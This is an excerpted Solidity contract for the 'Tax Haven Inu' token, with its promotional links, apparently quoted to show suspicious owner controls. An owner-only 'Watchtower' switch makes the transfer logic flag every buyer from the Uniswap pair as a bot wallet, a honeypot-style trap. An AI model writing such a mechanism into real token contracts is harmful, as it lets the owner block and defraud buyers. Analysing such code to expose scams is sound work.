...
Telegram Portal: https://t.me/TaxHavenInu
Website: https://www.TaxHavenInu.Online
Twitter: https://twitter.com/TaxHavenInu
...
contract TaxHavenInu is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0xF0b913F1B00d098e6BfCB2d02b2ee83e8B758465));
    ...
    string private _name = "Tax Haven Inu";
    string private _symbol = "TAXHAVENINU";
    ...
    function TaxMan() public onlyOwner {
    ...
    function setWatchtower(bool on) public onlyOwner {
        Watchtower = on;
    }
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && Watchtower) {
            botWallets[to] = true;
            botsWallet.push(to);
        }
